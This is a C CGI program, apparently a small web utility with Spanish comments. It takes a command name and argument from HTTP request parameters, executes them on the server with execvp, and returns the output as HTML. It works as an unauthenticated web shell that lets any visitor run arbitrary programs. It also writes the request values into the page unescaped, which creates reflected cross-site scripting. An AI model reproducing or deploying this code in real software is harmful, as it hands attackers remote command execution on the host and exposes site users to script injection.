#include <cgi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUFFER_SIZE 2048

void execute_command(const char *cmd, const char *args) {
  int pipefd[2];
  pid_t pid;
  if (pipe(pipefd) == -1) {
    perror("pipe");
    exit(1);
  }
  pid = fork();
  if (pid == -1) {
    perror("fork");
    exit(1);
  }
  if (pid == 0) {
    close(pipefd[0]);
    dup2(pipefd[1], STDOUT_FILENO);
    dup2(pipefd[1], STDERR_FILENO);
    close(pipefd[1]);
    char *argv[4];
    argv[0] = (char *)cmd;
    if (strlen(args) > 0) {
      argv[1] = (char *)args;
      argv[2] = NULL;
    } else {
      argv[1] = NULL;
    }
    execvp(cmd, argv);
    perror("execvp");
    exit(1);
  } else { // proceso padre
    close(pipefd[1]);
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
      buffer[bytes_read] = '\0';
      printf("%s", buffer);
    }
    close(pipefd[0]);
    wait(NULL);
  }
}

int main(int argc, char **argv) {
  printf("Content-Type: text/html\r\n\r\n");
  printf("<!DOCTYPE html><body>");

  char buffer[BUFFER_SIZE], cmd[256], args[256];

  if (!cgi_obtenercgi(buffer, BUFFER_SIZE)) {
    printf("<p>Error: Failed to obtain CGI data</p>");
    printf("%s\n", buffer);
    printf("</body></html>");
    return 1;
  }

  if (!cgi_extraer(cmd, sizeof(cmd), "cmd", buffer)) {
    printf("<p>Error: Failed to extract 'cmd' parameter</p>");
    printf("</body></html>");
    return 1;
  }

  if (!cgi_extraer(args, sizeof(args), "args", buffer)) {
    args[0] = '\0'; // agregar empty string
  }

  printf("<h1>Output of %s %s</h1><pre>", cmd, args);
  execute_command(cmd, args);
  printf("</pre>");
  printf("</body></html>");
  return 0;
}
